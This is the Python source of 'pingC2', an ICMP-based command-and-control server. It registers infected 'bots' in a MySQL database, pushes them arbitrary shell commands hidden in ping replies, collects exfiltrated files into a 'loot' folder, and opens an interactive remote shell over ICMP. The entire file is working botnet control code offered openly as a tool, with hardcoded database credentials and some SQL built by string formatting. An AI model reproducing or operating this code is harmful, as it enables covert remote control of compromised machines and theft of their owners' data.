#!/usr/bin/python

# pingC2 ICMP C2 server application
#  written by NoCow
# This is the server side application for the ICMP C2 project. The server will sniff ICMP packets 
#  and listen for the data payload of "What shall I do master?". If this data is received,
#  a command is sent to the client. Command must start with "run"

from multiprocessing import *
from datetime import date
#from impacket import ImpactDecoder
#from impacket import ImpactPacket
from threading import *
import time
import select
import subprocess
import socket
import threading
import MySQLdb
import ctypes
import sys
import signal
import os
from scapy.all import *

# ICMP shell for single bot
def icmpshell(botNum,botIP,botConnect):
	import select
	#print "[D] botconnect %s" % botConnect.value 
	if subprocess.mswindows:
        	sys.stderr.write('icmpsh master can only run on Posix systems\n')
       		exit(255)

   	try:
        	from impacket import ImpactDecoder
        	from impacket import ImpactPacket
    	except ImportError:
        	sys.stderr.write('You need to install Python Impacket library first\n')
        	exit(255)

    	# Open one socket for ICMP protocol
    	# A special option is set on the socket so that IP headers are included
    	# with the returned data
    	try:
        	sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    	except socket.error, e:
        	sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        	exit(1)

    	sock.setblocking(0)
    	sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

	# Make standard input a non-blocking file
    	#stdin_fd = sys.stdin.fileno()
    	#setNonBlocking(stdin_fd)	
	
	# Create a new IP packet and set its source and destination addresses
    	ip = ImpactPacket.IP()
    	ip.set_ip_dst(botIP)

    	# Create a new ICMP packet of type ECHO REPLY
    	icmp = ImpactPacket.ICMP()
    	icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    	# Instantiate an IP packets decoder
    	decoder = ImpactDecoder.IPDecoder()
 	while 1:
        	cmd = ''
        # Wait for incoming replies
		if sock in select.select([ sock ], [], [])[0]:
			buff = sock.recv(4096)

           	if 0 == len(buff):
                	# Socket remotely closed
               		print "[*] Socket closed"
			sock.close()
               		sys.exit(0)

            	# Packet received; decode and display it
            	ippacket = decoder.decode(buff)
           	icmppacket = ippacket.child()

            	# If the packet matches, report it to the user
          	if ippacket.get_ip_src() == botIP and 8 == icmppacket.get_icmp_type():
			# Get identifier and sequence number
                	ip_ident = ippacket.get_ip_id()
			ident = icmppacket.get_icmp_id()
                	seq_id = icmppacket.get_icmp_seq()
                	data = icmppacket.get_data_as_string()
			print "[D] Data received: %s" % str(data)
               		if len(data) > 0:
				sys.stdout.write(data)
				sys.stdout.flush()
                	# Parse command from standard input
               		try:
                  		cmd = sys.stdin.readline()
                		sys.stdout.flush()
				#print "[D] cmd: %s" % cmd
			except Exception,e:
                    		print str(e)

                	# Set sequence number and identifier
                	ip.set_ip_id(ip_ident)
			icmp.set_icmp_id(ident)
                	icmp.set_icmp_seq(seq_id)

               		# Include the command as data inside the ICMP packet
               		icmp.contains(ImpactPacket.Data(cmd))

               		# Calculate its checksum
              		icmp.set_icmp_cksum(0)
               		icmp.auto_checksum = 1

               		# Have the IP packet contain the ICMP packet (along with its payload)
               		ip.contains(icmp)

               		# Send it to the target host
               		sock.sendto(ip.get_packet(), (botIP, 0))
			#print "[D] Sent: %s" % cmd
			if cmd == 'exit\n':
                		botConnect.value = 0
				sock.close()
				return	

def getBotIP(botId):
	print "[*] Getting bot(%s) IP address" % botId
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
	cur = db.cursor()
	query = "select remoteip from bots where id=%s" % botId
	cur.execute(query)
	row = cur.fetchone()
	if row:
		db.close()
		return row[0]
	else:
		db.close()
		return	

# Catch file as it comes from bot
def catchFile(request, botId):
	fileContents = request.split()
       	filename = 'bot' + str(botId) + '_' + fileContents[2]
        filename_clean = filename.replace('/','_')
	filename_clean = 'loot/' + filename_clean
	#print "[D] File contents: %s" % fileContents
	#print "[*] Catching file (%s) from bot: %s" % (filename_clean,botId)
	if fileContents[0] == '(FILE_START)':
		print "[*] File start: %s" % filename_clean
		file = open(filename_clean, 'w')
		file.write('')
		file.close()
	elif fileContents[0] == '(FILE_END)':
		print "[*] File end: %s" % filename
		file = open(filename_clean, 'a')
		file.write('')
		file.close()
	else:
		file = open(filename_clean, 'a')
		#print "[D] Writing line to file: %s" % str(fileContents[2:])
		write_line = ' '.join(map(str,fileContents[3:]))
		write_line = write_line + '\n'
		file.write(write_line)
		#print "[D] Line written: %s" % str(line)
		file.close()
	file.close()

# Response function
def sendPingResponse(dstIP,packetId,icmpId,command):
	#print "[*] Creating response for %s" % botId
	resp = IP(dst=dstIP,id=packetId)/ICMP(type="echo-reply",id=icmpId)/str(command)
        #resp.show2()
        send(resp)
        #print "\n[*] Response sent!"

def displayBots():
	print "[*] Displaying bots!"
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	print '{0: <10}'.format('ID'),'{0: <20}'.format('RemoteIP'),'{0: <20}'.format('LocalIP'),'{0: <20}'.format('Name'),'{0: <20}'.format('OS'),'{0: <20}'.format('Checkin date')
	print "---------------------------------------------------------------------------------------------------------"
	cur.execute("select id,remoteip,localip,name,os,checkin from bots")
        for row in cur.fetchall():
        	print '{0: <10}'.format(row[0]),'{0: <20}'.format(row[1]),'{0: <20}'.format(row[2]),'{0: <20}'.format(row[3]),'{0: <20}'.format(row[4]), row[5]
	db.close()

def updateBotSysinfo(botId,remoteIP,name,os):
	print "[*] Updating bot info"
	db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	try:
		cur.execute("update bots set remoteip=%s,name=%s,os=%s where id=%s",(remoteIP,name,os,botId))
	except Exception,e:
		print "[X] " + str(e)
		return False
	db.commit()
	print "[*] Bot info updated"
	db.close()
	return True

def doesBotExist(botId):
	#print "[*] Checking bot existence"
        db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
        cur = db.cursor()
	query = "select * from bots where id=%i" % botId
        #print "[D] Query: "+query
        cur.execute(query)
        if cur.fetchall():
                #print "[*] Bot ID exists"
		db.close()
		return True
	else:
		db.close()
		return False


def addBot(srcIP,name,os):
	print "[*] Adding bot"
	botId=0
	try:
		db = MySQLdb.connect(host="localhost", # your host, usually localhost
                     user="pingc2user", # your username
                     passwd="pingc2user", # your password
                     db="pingc2") # name of the data base
        # you must create a Cursor object. It will let
        #  you execute all the query you need
		cur = db.cursor()
		cur.execute("select max(id) from bots")
		row = cur.fetchone()
		if row[0]:
			botId=int(row[0]) + 1
			print "[*] Adding bot number %s!" % botId
		else:
			botId=1
			print "[*} Adding first bot to PingC2!"
		cur.execute("""insert into bots (remoteip,name,os,checkin) values(%s,%s,%s,%s)""",(srcIP,name,os,date.today()))
                db.commit()
        except Exception,e:
        	print "[X] Error: " + str(e)
	print "[*] Bot ID(%s) added!" % botId
	db.close()
	return botId	

def displayMenu():
	listener = False
	print "\nChoose an option"
        #print "[D] Debug: ", active_children()
	#print len(active_children())
	for proc in active_children():
		if (proc.name == 'C2Listener'):
			listener = True;
        if listener == False:
		print "1) Start C2 listener"
	print "2) Display bots"
        print "3) Change bot command ('l' to list commands)"
        print "4) Control single bot"
	print "5) Shell (single bot)"
	if listener == True:
		print "S) Stop C2 listener"
	print "q) Quit"

# Inerrupt handler to kill process cleanly
def handler(signum, frame):
	print 'Bye!'		
	sys.exit()

# Command and Control main function
def c2main(command,botShell,botConnect):
	print ""
        print "[*] Command received from C2: %s" % command.value
	while True:
		logfile_error = open('errors.log','w')
		conf.verb = 0
        	count = 1
		#print "[D] BotshllIP: %s" % botShellIP
		filter = "icmp"
		packet = sniff(count,filter=filter)
		for p in packet:
        		#p.show2()
                	try:
                		request = p['Raw'].load
                        	ip_id = p['IP'].id
                       		icmp_id = p['ICMP'].id
        		
				#print "[*] Request: " + request
				if 'What shall I do master?' in request:
					print "[*] Bot(%s) requesting command" % request[24:]
					botId = int(request[24:])
					if doesBotExist(botId):
						print "[*] Bot ID exists, ready to send command"
						#print "[D] botId = %s and botShell.value = %s" % (botId,botShell.value)
						if (botId == int(botShell.value)):
							print "[*] Sending command to start shell to bot(%s) at %s" % (botId, p['IP'].src)
							sendPingResponse(p['IP'].src,ip_id,icmp_id,'shell')
							botConnect.value = 1
							return
						else:
							sendPingResponse(p['IP'].src,ip_id,icmp_id,command.value)
                                                	print "\n[*] Response sent to %s: %s" % (p['IP'].src,command.value)
							print "Option: "
                                        else:
                                        	print "[*] Client not registered"
                        	# Checkin function
				elif 'Checkin' in request:
					# Build checkin database and info to capture
					print "\n[*] %s checking in" % p['IP'].src
					checkinInfo = request[8:].split()
                                        botId = addBot(p['IP'].src,checkinInfo[1],checkinInfo[0])
					sendId = "id="+str(botId)
					#print "[D] SendId: ",sendId
					sendPingResponse(p['IP'].src,ip_id,icmp_id,sendId)
					#resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/sendId
                                        #resp.show2()
                                        #send(resp)
                                        print "\n[*] Response sent to %s: %s after checkin" % (p['IP'].src,command.value)
                                        print "Option: "
				elif 'sysinfo' in request:
					# Build sysinfo capture system database
                        		print "[D] Inside sysinfo"
					sysinfo = request.split()					
					#print "[D] Id: " + sysinfo[0]
                                	print "\n[*] Received sysinfo from client: %s" % sysinfo[1]
					if doesBotExist(int(sysinfo[1])):
						updateBotSysinfo(int(sysinfo[1]),p['IP'].src,sysinfo[3],sysinfo[2])
                                               	print "[*] Updated sysinfo for machine(%s) from IP: %s" % (sysinfo[1],p['IP'].src)
					else:
						print "[*] Machine does not exist, ignoring"
	
					resp = IP(dst=p['IP'].src,id=ip_id)/ICMP(type="echo-reply",id=icmp_id)/"Thanks"
                                	#resp.show2()
                                	print "\n[*] Response sent: Thanks"
                                	send(resp)
                        		print "Option: "
				elif '(FILE' in request:
					if doesBotExist(int(request.split()[1])):
						#print "[D] Catching file"
						catchFile(request,int(request.split()[1]))
						sendPingResponse(p['IP'].src,ip_id,icmp_id,"Thanks")
					else:
						print "[*] Machine does not exist, ignoring"
				else:   
                                        print "[**] Client not recognized"
                	except:
				error = "[X] ERROR: " + str(sys.exc_info()[0])
                        	logfile_error.write(error)

def main():
	print "	--------------------------------------------"
	print "	  _____    _                    _____   ___  "
 	print "	 |  __ \  (_)                  / ____| |__ \ "
 	print "	 | |__) |  _   _ __     __ _  | |         ) |"
 	print "	 |  ___/  | | | '_ \   / _` | | |        / / "
 	print "	 | |      | | | | | | | (_| | | |____   / /_ "
 	print "	 |_|      |_| |_| |_|  \__, |  \_____| |____|"
        print "        		        _/ |                "
        print "	 		      |___/		    "
        print "	 					    "
	print "	 		Command Center              "
	print "	 		   by NoCow		    "
	print "	--------------------------------------------"
	manager = Manager()
	command = manager.Namespace()
	command.value = 'sysinfo'
	botShell = manager.Namespace()
	botShell.value = '123456789'
	botConnect = manager.Namespace()
	botConnect.value = 0
	killsig = manager.Namespace()
	killsig = 0
	#print "[*] Command: %s" % command.value
	process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
	displayMenu()
	while True:
		signal.signal(signal.SIGINT, handler)
		#displayMenu()
		try:
			option = raw_input("Option: ")
		except Exception,e:
			print "[X] Error: " + str(e)
		#print "[D] Option chosen: ",option
		if option == '1':
			command.value = raw_input("Enter command: ")
			if (len(active_children()) > 1):
				print "[*] Capture running. Stopping first."
				for proc in active_children():
					if proc.name != 'SyncManager-1':		
						#print "[D] Killing process: ", proc.name
						proc.terminate()
				print "[*] Starting new capture"
				try:
					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
					process.start()
					if process.is_alive():
						print "[*] C2 Listening - command: %s" % command.value
					else:
						print "[X] Error starting C2 listener"
				except Exception, e:
					print "[X] Error: " + str(e)
			else:
				print "[*] No listener currently running. Starting..."
				try:
					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
					process.start()
					if process.is_alive():
						print "[*] C2 Listening - command: %s" % command.value
					else:
						print "[X] Error starting C2 listener"
				except Exception, e:
					print "[X] Error: " + str(e)
		elif option == '2':
			print "[*] Displaying bots!"
			displayBots()
		elif option == '3':
                        if process.is_alive():
                        	command.value = raw_input("Enter a command: ")
				print "[*] C2 Listening - command: %s" % command.value
                        else:
                                print "[X] C2 listener not running. Please start listener first"
		elif option == '4':
			print "[*] Bot control!"
			displayBots()
			botNum = raw_input("Bot # to control: ")
			print "[*] Controlling bot(%s)" % botNum
		elif option == '5':
			print "[*] Bot shell!"
			displayBots()
			botNum = raw_input("Bot # for shell: ")
			if botNum == '123456789':
				botShell.value = '123456789'
			else:
				botIP = getBotIP(botNum)
				if botIP:
					print "[*] Setting botshell value to %s" % botNum
					botShell.value = botNum
					try:    
                                        	icmp_shell = Thread(name='ICMPshell',target=icmpshell,args=(botNum,botIP,botConnect,))
						icmp_shell.daemon = True
						while True:
							if botConnect.value == 1:
								for proc in active_children():
									if proc.name == 'C2Listener':
										proc.terminate()
								icmp_shell.start()
								if icmp_shell.is_alive():
									print "[*] ICMP shell started for bot(%s) at %s" % (botNum,botIP)
									icmp_shell.join()
									botConnect.value = 0
									botShell.value = 123456789
									try:
                                        					process = Process(name='C2Listener',target=c2main,args=(command,botShell,botConnect,))
                                        					process.start()
                                        					if process.is_alive():
                                                					print "[*] Restarting listener - command: %s" % command.value
                                        					else:
                                                					print "[X] Error starting C2 listener"
                                					except Exception, e:
                                        					print "[X] Error: " + str(e)
									break
                                                		else:
                                             				print "[X] Error starting ICMP shell"
                                        except Exception, e:
                                        	print "[X] Error: " + str(e)
				else:
					print "[X] Bot does not exist!"
			#print "[D] Bot IP for icmpsh: %s" % botIP
		elif option == 'S':
			for proc in active_children():
				if proc.name == 'C2Listener':
					proc.terminate()
		elif option == 'l':
			print "\n Available commands: run <raw command>, sleep <seconds>, sysinfo, get <filename>"
		# Hidden debug option - display relevant info
		elif option == 'd':
			print "[D] Running Processes: ", active_children()
		elif option == 'q':
			for proc in active_children():
				print "[*] Terminating process: " + str(proc.name)
				proc.terminate()
			print "[*] All processes terminated, exiting"
			sys.exit()
		else:
			print "Invalid Option...please try again"
		displayMenu()
	
if __name__ == "__main__":
	main()
